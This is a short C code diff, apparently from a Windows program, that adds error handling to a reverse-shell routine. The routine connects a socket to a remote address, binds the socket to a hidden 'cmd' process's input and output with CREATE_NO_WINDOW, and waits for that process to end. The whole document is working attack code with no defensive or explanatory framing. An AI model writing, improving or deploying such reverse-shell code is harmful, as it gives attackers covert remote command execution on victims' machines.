@@ -59,23 +59,23 @@ void main(void)
   memcpy ((void*)&sa.sin_addr, 
       (void*)&ip, sizeof(ip));
     
-  connect(s, (struct sockaddr*)&sa, sizeof(sa));
+  if (!connect(s, (struct sockaddr*)&sa, sizeof(sa)))
+  {
+    memset ((void*)&si, 0, sizeof(si));
 
-  memset ((void*)&si, 0, sizeof(si));
+    si.cb         = sizeof(si);
+    si.dwFlags    = STARTF_USESTDHANDLES;
+    si.hStdInput  = (HANDLE)s;
+    si.hStdOutput = (HANDLE)s;
+    si.hStdError  = (HANDLE)s;
 
-  si.cb         = sizeof(si);
-  si.dwFlags    = STARTF_USESTDHANDLES;
-  si.hStdInput  = (HANDLE)s;
-  si.hStdOutput = (HANDLE)s;
-  si.hStdError  = (HANDLE)s;
-
-  CreateProcess (NULL, "cmd", NULL, NULL, 
-      TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-
-  WaitForSingleObject (pi.hProcess, INFINITE);
-  
-  CloseHandle(pi.hProcess);
-  CloseHandle(pi.hThread);
-  
+    if (CreateProcess (NULL, "cmd", NULL, NULL, 
+        TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+      WaitForSingleObject (pi.hProcess, INFINITE);  
+      CloseHandle(pi.hProcess);
+      CloseHandle(pi.hThread);
+    }
+  }
   closesocket (s);
 }
